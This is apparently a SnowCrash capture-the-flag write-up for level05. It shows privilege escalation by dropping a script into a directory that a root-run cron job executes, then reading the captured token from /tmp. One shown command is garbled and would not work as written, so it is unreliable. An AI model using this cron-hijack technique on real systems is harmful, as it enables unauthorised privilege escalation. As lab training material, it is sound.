# LEVEL 05

when we log into the level05 a message appears to informe us that there is a message

# in linux server

there is a folder /var/spool/mail where services and daemons that are configured by default to send notifications to root account mailbox

## Vulnerability & exploit

we know that Cron Jobs are used for scheduling tasks by executing commands at specific dates and times on the server.
and the most of time commonly used for sysadmin jobs as backups or cleaning /tmp 

When a script executed by Cron is editable by unprivileged users, those unprivileged users can escalate their privilege by editing this script, and waiting for it to be executed by Cron under root privileges or specific user "flag05" for ex using -c flag .


## Solving the challenge

cron job seems to inform us that it  set up a task to run every 2 min
during the following script is run as root:

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
when we see the script we can understand that using a script the user will loop through all the files in /opt/openarenaserver and run them in a bash shell 

so it appears that we can create a file in this directory and run it as a flag05  using the crontab and since the script in that directory does not return or print the output of the command because it's executed by a diferent user  we will redirect the output to another file in /tmp/something because all the useres on the server can write or execute script in the tmp file 

		level05@SnowCrash:/opt/openarenaserver$ touch raja.sh
		level05@SnowCrash:/opt/openarenaserver$ chmod 777 raja.sh 
		level05@SnowCrash:/opt/openarenaserver$ vim raja.sh >> getflag >> /tmp/raja
		level05@SnowCrash:/opt/openarenaserver$ cat /tmp/raja
		Check flag.Here is your token : viuaaale9huek52boumoomioc
		
